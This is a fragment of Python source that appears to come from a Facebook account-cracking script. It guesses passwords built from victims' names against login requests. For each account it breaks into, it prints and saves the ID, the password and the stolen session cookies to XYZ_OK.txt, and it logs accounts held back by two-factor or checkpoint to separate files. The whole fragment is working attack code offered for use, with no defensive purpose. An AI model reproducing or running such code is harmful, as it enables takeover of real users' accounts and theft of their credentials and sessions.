...
def api3(ids,names,passlist):
        try:
                global oks,loop,sim_id
                YounisXyz = random.choice([H,M,K,B])
                sys.stdout.write(f'\r\r\033[0;97m [{YounisXyz}M3\033[0;97m] %s|\033[1;92mOK:%s \033[0;97m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {coki}")
                                        open('XYZ_OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;36m[TWO-FECTOR] '+ids+' | '+pas)
                                                open('XYZ_2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [CHECKPOINT] '+ids+' | '+pas+'\033[1;97m')
                                                open('XYZ_CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('XYZ_CP.txt','a').write(ids+'|'+pas+'\n')
